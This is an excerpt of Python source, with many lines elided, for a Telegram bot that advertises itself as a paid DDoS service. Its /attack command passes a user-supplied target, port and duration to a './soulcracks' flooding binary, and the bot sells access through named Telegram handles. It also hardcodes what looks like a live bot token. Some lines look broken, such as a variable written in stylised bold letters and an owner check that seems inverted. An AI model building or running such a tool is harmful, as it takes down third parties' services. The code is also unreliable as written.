...
bot = telebot.TeleBot('7074559050:AAF4Kl2YEzMvGdvD-xv1xX7dF_zEK3eDsEk')
admin_id = ["6321758394"]
...
def remove_user(message):
    ...
    if user_id in admin_id:
        ...
        response = "𝗪𝗘 𝗔𝗥𝗘 𝗦𝗢𝗥𝗥𝗬 𝗬𝗢𝗨 𝗔𝗥𝗘 𝗡𝗢𝗧 𝗢𝗪𝗡𝗘𝗥 𝗢𝗙 𝗧𝗛𝗜𝗦 𝗕𝗢𝗧 . 𝗢𝗪𝗡𝗘𝗥 𝗜𝗦 - @SWARG_DEVELOPER"
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  
            ...
            if time > 300:
                ...
                full_command = f"./soulcracks {target} {port} {time} 200"
        ...
        response = "🚫 𝗬𝗢𝗨 𝗛𝗔𝗩𝗘𝗡'𝗧 𝗣𝗨𝗥𝗖𝗛𝗔𝗦𝗘 𝗠𝗘𝗠𝗕𝗘𝗥𝗦𝗛𝗜𝗣 𝗢𝗙 𝗕𝗢𝗧. 𝗧𝗢 𝗕𝗨𝗬 𝗗𝗠 - @LEGENDXOPL"
...
def welcome_start(message):
    ...
    response = f'''𝗪𝗘𝗟𝗖𝗢𝗠𝗘 {𝐮𝐬𝐞𝐫_𝐧𝐚𝐦𝐞} 𝗧𝗢 𝗠𝗬 𝗗𝗗𝗢𝗦 ☠️ 𝗕𝗢𝗧 :-\n𝗙𝗢𝗥 𝗠𝗢𝗥𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 𝗧𝗥𝗬 𝗧𝗢 𝗥𝗨𝗡 𝗧𝗛𝗜𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 : /attack\n'''
    bot.reply_to(message, response)
    
@bot.message_handler(commands=['owner'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''@SWARG_DEVELOPER'''
    bot.reply_to(message, response)
